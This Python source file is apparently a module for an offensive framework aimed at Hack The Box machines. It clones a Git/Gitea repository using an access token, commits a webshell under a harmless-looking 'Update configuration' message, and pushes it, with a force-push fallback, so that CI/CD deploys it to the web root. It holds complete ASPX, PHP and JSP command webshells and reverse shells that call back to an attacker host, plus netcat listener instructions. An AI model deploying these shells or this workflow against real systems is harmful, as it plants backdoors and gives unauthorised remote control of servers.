from core.module_base import ModuleBase, ModuleType, Platform
import subprocess
import tempfile
import os
import shutil


class GitWebshell(ModuleBase):
    def __init__(self):
        super().__init__()
        self.name = "git_webshell"
        self.description = "Deploy webshells via git push when CI/CD auto-deploys to web root"
        self.author = "HTB-Auto"
        self.module_type = ModuleType.EXPLOIT
        self.platform = Platform.MULTI
        self.tags = ["git", "gitea", "cicd", "webshell", "aspx", "php", "jsp", "web"]

        self.register_option("RHOSTS", "Target Gitea/Git server host", required=True)
        self.register_option("RPORT", "Target Gitea/Git server port", required=True, default="3000")
        self.register_option("REPO_URL", "Full git clone URL (e.g., http://host:3000/user/repo.git)", required=False)
        self.register_option("USERNAME", "Git username for authentication", required=False)
        self.register_option("TOKEN", "Personal Access Token for git authentication", required=True)
        self.register_option("REPO_NAME", "Repository name to clone/push to", required=True)
        self.register_option("REPO_OWNER", "Repository owner/organization", required=True)
        self.register_option("SHELL_TYPE", "Webshell type: aspx, php, jsp", required=True, default="aspx")
        self.register_option("SHELL_NAME", "Name for the webshell file", required=False, default="shell")
        self.register_option("LHOST", "Local host for reverse shell callback", required=False)
        self.register_option("LPORT", "Local port for reverse shell callback", required=False, default="4444")
        self.register_option("BRANCH", "Git branch to push to", required=False, default="main")
        self.register_option("COMMIT_MSG", "Commit message", required=False, default="Update configuration")
        self.register_option("SUBDIR", "Subdirectory in repo to place shell", required=False, default="")
        self.register_option("PROTOCOL", "Protocol: http or https", required=False, default="http")

    def _get_aspx_webshell(self, lhost=None, lport=None):
        """Generate ASPX webshell - command execution version"""
        return '''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    string cmd = Request.QueryString["cmd"];
    if (!string.IsNullOrEmpty(cmd))
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + cmd;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        
        Process p = Process.Start(psi);
        string output = p.StandardOutput.ReadToEnd();
        string error = p.StandardError.ReadToEnd();
        p.WaitForExit();
        
        Response.Write("<pre>" + Server.HtmlEncode(output + error) + "</pre>");
    }
}
</script>
<html>
<body>
<form method="GET">
<input type="text" name="cmd" size="50" />
<input type="submit" value="Execute" />
</form>
</body>
</html>'''

    def _get_aspx_reverse_shell(self, lhost, lport):
        """Generate ASPX reverse shell"""
        return f'''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{{
    try
    {{
        using(TcpClient client = new TcpClient("{lhost}", {lport}))
        {{
            using(Stream stream = client.GetStream())
            {{
                using(StreamReader rdr = new StreamReader(stream))
                {{
                    using(StreamWriter wtr = new StreamWriter(stream))
                    {{
                        wtr.AutoFlush = true;
                        wtr.WriteLine("Connected to shell");
                        string cmd;
                        while((cmd = rdr.ReadLine()) != null)
                        {{
                            if(cmd.ToLower() == "exit") break;
                            ProcessStartInfo psi = new ProcessStartInfo();
                            psi.FileName = "cmd.exe";
                            psi.Arguments = "/c " + cmd;
                            psi.RedirectStandardOutput = true;
                            psi.RedirectStandardError = true;
                            psi.UseShellExecute = false;
                            psi.CreateNoWindow = true;
                            Process p = Process.Start(psi);
                            wtr.WriteLine(p.StandardOutput.ReadToEnd());
                            wtr.WriteLine(p.StandardError.ReadToEnd());
                            p.WaitForExit();
                        }}
                    }}
                }}
            }}
        }}
    }}
    catch(Exception ex)
    {{
        Response.Write("Error: " + ex.Message);
    }}
}}
</script>'''

    def _get_php_webshell(self, lhost=None, lport=None):
        """Generate PHP webshell - command execution version"""
        return '''<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
<html>
<body>
<form method="GET">
<input type="text" name="cmd" size="50" />
<input type="submit" value="Execute" />
</form>
</body>
</html>'''

    def _get_php_reverse_shell(self, lhost, lport):
        """Generate PHP reverse shell"""
        return f'''<?php
set_time_limit(0);
$ip = '{lhost}';
$port = {lport};
$chunk_size = 1400;
$shell = 'cmd.exe';
if(function_exists('pcntl_fork')) {{
    $pid = pcntl_fork();
    if($pid == -1) {{ die('fork failed'); }}
    if($pid) {{ exit(0); }}
    if(posix_setsid() == -1) {{ die('setsid failed'); }}
}}
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if(!$sock) {{ die("socket failed: $errstr ($errno)"); }}
$descriptorspec = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "w")
);
$process = proc_open($shell, $descriptorspec, $pipes);
if(!is_resource($process)) {{ die("proc_open failed"); }}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
while(1) {{
    if(feof($sock) || feof($pipes[1])) {{ break; }}
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $write_a = NULL;
    $error_a = NULL;
    $num_changed = stream_select($read_a, $write_a, $error_a, NULL);
    if(in_array($sock, $read_a)) {{
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }}
    if(in_array($pipes[1], $read_a)) {{
        $output = fread($pipes[1], $chunk_size);
        fwrite($sock, $output);
    }}
    if(in_array($pipes[2], $read_a)) {{
        $output = fread($pipes[2], $chunk_size);
        fwrite($sock, $output);
    }}
}}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>'''

    def _get_jsp_webshell(self, lhost=None, lport=None):
        """Generate JSP webshell - command execution version"""
        return '''<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    String os = System.getProperty("os.name").toLowerCase();
    String[] cmdArray;
    if(os.contains("win")) {
        cmdArray = new String[]{"cmd.exe", "/c", cmd};
    } else {
        cmdArray = new String[]{"/bin/bash", "-c", cmd};
    }
    Process p = Runtime.getRuntime().exec(cmdArray);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    BufferedReader be = new BufferedReader(new InputStreamReader(p.getErrorStream()));
    String line;
    out.println("<pre>");
    while((line = br.readLine()) != null) {
        out.println(line);
    }
    while((line = be.readLine()) != null) {
        out.println(line);
    }
    out.println("</pre>");
}
%>
<html>
<body>
<form method="GET">
<input type="text" name="cmd" size="50" />
<input type="submit" value="Execute" />
</form>
</body>
</html>'''

    def _get_jsp_reverse_shell(self, lhost, lport):
        """Generate JSP reverse shell"""
        return f'''<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%
    String host="{lhost}";
    int port={lport};
    String cmd="cmd.exe";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
    Socket s=new Socket(host,port);
    InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
    OutputStream po=p.getOutputStream(),so=s.getOutputStream();
    while(!s.isClosed()){{
        while(pi.available()>0)so.write(pi.read());
        while(pe.available()>0)so.write(pe.read());
        while(si.available()>0)po.write(si.read());
        so.flush();po.flush();
        Thread.sleep(50);
        try {{p.exitValue();break;}}catch (Exception e){{}}
    }};
    p.destroy();s.close();
%>'''

    def _run_command(self, cmd, cwd=None):
        """Run a shell command and return output"""
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                cwd=cwd,
                capture_output=True,
                text=True,
                timeout=60
            )
            return result.returncode == 0, result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return False, "Command timed out"
        except Exception as e:
            return False, str(e)

    def run(self) -> bool:
        target = self.get_option("RHOSTS")
        port = self.get_option("RPORT")
        token = self.get_option("TOKEN")
        repo_name = self.get_option("REPO_NAME")
        repo_owner = self.get_option("REPO_OWNER")
        shell_type = self.get_option("SHELL_TYPE").lower()
        shell_name = self.get_option("SHELL_NAME")
        lhost = self.get_option("LHOST")
        lport = self.get_option("LPORT")
        branch = self.get_option("BRANCH")
        commit_msg = self.get_option("COMMIT_MSG")
        subdir = self.get_option("SUBDIR")
        protocol = self.get_option("PROTOCOL")
        username = self.get_option("USERNAME") or repo_owner
        repo_url = self.get_option("REPO_URL")

        # Validate shell type
        if shell_type not in ["aspx", "php", "jsp"]:
            self.print_error(f"Invalid shell type: {shell_type}. Must be aspx, php, or jsp")
            return False

        # Build repo URL if not provided
        if not repo_url:
            repo_url = f"{protocol}://{username}:{token}@{target}:{port}/{repo_owner}/{repo_name}.git"
        else:
            # Insert credentials into provided URL
            if "://" in repo_url:
                proto, rest = repo_url.split("://", 1)
                repo_url = f"{proto}://{username}:{token}@{rest}"

        self.print_status(f"Target: {target}:{port}")
        self.print_status(f"Repository: {repo_owner}/{repo_name}")
        self.print_status(f"Shell type: {shell_type}")

        # Create temp directory for git operations
        temp_dir = tempfile.mkdtemp(prefix="git_webshell_")
        self.print_status(f"Working directory: {temp_dir}")

        try:
            # Clone the repository
            self.print_status("Cloning repository...")
            clone_cmd = f"git clone {repo_url} repo"
            success, output = self._run_command(clone_cmd, cwd=temp_dir)
            
            if not success:
                # Try without .git extension
                repo_url_no_git = repo_url.rstrip('.git')
                clone_cmd = f"git clone {repo_url_no_git} repo"
                success, output = self._run_command(clone_cmd, cwd=temp_dir)
                
            if not success:
                self.print_error(f"Failed to clone repository: {output}")
                return False
            
            self.print_good("Repository cloned successfully")
            repo_dir = os.path.join(temp_dir, "repo")

            # Switch to target branch
            self.print_status(f"Checking out branch: {branch}")
            checkout_cmd = f"git checkout {branch} 2>/dev/null || git checkout -b {branch}"
            success, output = self._run_command(checkout_cmd, cwd=repo_dir)

            # Determine shell content
            extensions = {"aspx": ".aspx", "php": ".php", "jsp": ".jsp"}
            shell_filename = f"{shell_name}{extensions[shell_type]}"
            
            # Generate webshell content
            if lhost and lport:
                self.print_status(f"Generating reverse shell -> {lhost}:{lport}")
                if shell_type == "aspx":
                    shell_content = self._get_aspx_reverse_shell(lhost, lport)
                elif shell_type == "php":
                    shell_content = self._get_php_reverse_shell(lhost, lport)
                else:
                    shell_content = self._get_jsp_reverse_shell(lhost, lport)
            else:
                self.print_status("Generating command execution webshell")
                if shell_type == "aspx":
                    shell_content = self._get_aspx_webshell()
                elif shell_type == "php":
                    shell_content = self._get_php_webshell()
                else:
                    shell_content = self._get_jsp_webshell()

            # Determine target path in repo
            if subdir:
                target_dir = os.path.join(repo_dir, subdir)
                os.makedirs(target_dir, exist_ok=True)
                shell_path = os.path.join(target_dir, shell_filename)
                relative_path = f"{subdir}/{shell_filename}"
            else:
                shell_path = os.path.join(repo_dir, shell_filename)
                relative_path = shell_filename

            # Write webshell
            self.print_status(f"Writing webshell to: {relative_path}")
            with open(shell_path, 'w') as f:
                f.write(shell_content)

            # Configure git
            self._run_command('git config user.email "deploy@auto.local"', cwd=repo_dir)
            self._run_command('git config user.name "Auto Deploy"', cwd=repo_dir)

            # Add and commit
            self.print_status("Adding files to git...")
            success, output = self._run_command(f"git add {relative_path}", cwd=repo_dir)
            if not success:
                self.print_error(f"Failed to add file: {output}")
                return False

            self.print_status(f"Committing with message: {commit_msg}")
            commit_cmd = f'git commit -m "{commit_msg}"'
            success, output = self._run_command(commit_cmd, cwd=repo_dir)
            if not success:
                self.print_error(f"Failed to commit: {output}")
                return False

            # Push to remote
            self.print_status(f"Pushing to {branch}...")
            push_cmd = f"git push origin {branch}"
            success, output = self._run_command(push_cmd, cwd=repo_dir)
            
            if not success:
                # Try force push if regular push fails
                self.print_warning("Regular push failed, attempting force push...")
                push_cmd = f"git push -f origin {branch}"
                success, output = self._run_command(push_cmd, cwd=repo_dir)
                
            if not success:
                self.print_error(f"Failed to push: {output}")
                return False

            self.print_good("Webshell deployed successfully!")
            self.print_good(f"Shell type: {shell_type.upper()}")
            
            # Print access information
            web_url = f"http://{target}/{relative_path}"
            self.print_good(f"Expected URL: {web_url}")
            
            if lhost and lport:
                self.print_status(f"Start listener: nc -lvnp {lport}")
                self.print_status(f"Then visit: {web_url}")
            else:
                self.print_status(f"Access: {web_url}?cmd=whoami")

            # Store results
            self.results["shell_path"] = relative_path
            self.results["shell_type"] = shell_type
            self.results["expected_url"] = web_url
            self.results["repo"] = f"{repo_owner}/{repo_name}"
            self.results["branch"] = branch

            return True

        except Exception as e:
            self.print_error(f"Error: {str(e)}")
            return False
        
        finally:
            # Cleanup temp directory
            try:
                shutil.rmtree(temp_dir)
                self.print_status("Cleaned up temporary files")
            except:
                pass
